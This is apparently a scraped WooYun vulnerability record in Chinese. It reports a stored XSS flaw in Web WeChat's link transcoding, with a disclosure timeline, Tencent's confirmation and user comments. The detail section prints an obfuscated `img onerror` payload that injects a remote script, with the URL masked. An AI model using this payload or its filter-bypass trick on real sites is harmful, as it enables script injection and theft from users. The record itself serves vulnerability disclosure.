{"id": 48416, "wybug_id": "wooyun-2014-082991", "wybug_title": "网页微信某处过滤不严格导致可调用远程恶意XSS", "wybug_corp": "腾讯", "wybug_author": "路人甲", "wybug_date": "2014-11-13 12:46", "wybug_open_date": "2014-12-28 12:48", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向公众公开  简要描述： 一直感觉此处有问题，今天总算找出来了 详细说明：  登录网页微信，发一个不在白名单的链接，我也不知道哪些网址在白名单，至少发百度会直接跳转到百度。比如我随便找了一个医院网址：www.cqbdyg.com，如图：\n\n点击刚才发的链接，结果如下：\n\n会出现上图的提示，再点击继续访问：\n\n看到没？微信把原网页内容转码了，会有没过滤到的地方吗？<script>不用看也知道过滤得毛都没有了，只好试试<img onerror>，测试过程就不写了，总之被过滤了，但是，当我今天偷懒再试的时候，发现如果网页中只写一个img标签，去掉其它<html><body>等无用标签，转码后的网页就会执行onerror后面的内容了，奇葩吧！\n<img width=0 height=0 onerror=\" var NagvIw1 = window['document']['getElementsByTagName']('HEAD')['item'](0);var LVdmojAqt2 = window['document']['createElement']('script');LVdmojAqt2['type'] = 'text/javascript';LVdmojAqt2['src'] = '*****.js';NagvIw1['appendChild'](LVdmojAqt2);\" src=\"1\" />\n如图：\n\n   漏洞证明：  \n\n\n\n   修复方案：  解铃还需系铃人，加油过滤吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-11-13 14:18 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-13 13:28 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  看标题，好厉害的样子啊    \n     2014-11-13 14:52 |    \t\t安然意境 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:79        | 无论是你的事业还是你的个人，可能走的过程...)\t\t \n  \"一直感觉此处有问题，今天总算找出来了\"    \n     2014-11-13 16:48 |    \t\tC4ndy \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        )\t\t \n  一直感觉此处有问题,一直没找出来    \n     2014-11-17 09:15 |    \t\t看什麼看 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 知有飄零，畢竟飄零，便是飄零也感卿)\t\t \n  可怕的直覺    \n     2014-11-17 14:47 |    \t\t落叶 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | xxxx)\t\t \n  原来你提交的..    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}